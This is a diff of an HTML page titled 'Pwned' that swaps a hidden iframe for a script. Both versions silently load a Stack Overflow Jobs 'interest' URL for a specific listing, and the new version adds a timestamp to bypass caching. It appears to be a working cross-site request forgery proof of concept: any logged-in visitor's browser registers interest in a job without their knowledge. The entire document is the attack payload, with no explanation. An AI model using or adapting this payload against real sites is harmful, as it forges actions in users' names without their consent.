@@ -2,7 +2,11 @@
   <head>
   </head>
   <body>
-    <iframe style="display:none;" src="https://stackoverflow.com/jobs/n/interest/199314?companyPageId=22170"></iframe>
     Pwned
+    <script>
+      var iframe = document.createElement('iframe');
+      iframe.src = "https://stackoverflow.com/jobs/n/interest/199314?companyPageId=22170&_"+new Date().getTime();
+      document.body.appendChild(iframe);
+    </script>
   </body>
 </html>
